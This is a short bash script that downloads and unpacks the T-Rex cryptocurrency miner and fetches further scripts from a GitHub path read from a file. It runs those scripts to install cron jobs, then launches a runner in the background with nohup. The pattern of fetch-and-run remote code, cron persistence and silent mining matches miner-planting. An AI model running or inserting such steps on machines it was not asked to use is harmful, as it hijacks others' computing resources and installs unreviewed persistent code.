#Get path from Cronjob
whoami > name.txt
namepath=$(head -1 name.txt)
path=/home/$namepath
cd $path
gitpath=$(head -1 gitpath.txt)

wget https://trex-miner.com/download/t-rex-0.24.7-linux.tar.gz
tar -zxvf t-rex-0.24.7-linux.tar.gz

wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
wget https://raw.githubusercontent.com/$gitpath/main/croncheck.sh
chmod +x cronadd.sh
chmod +x croncheck.sh
./cronadd.sh
./croncheck.sh

wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
chmod +x runsrc.sh

nohup sh runsrc.sh > result.log 2>&1 &


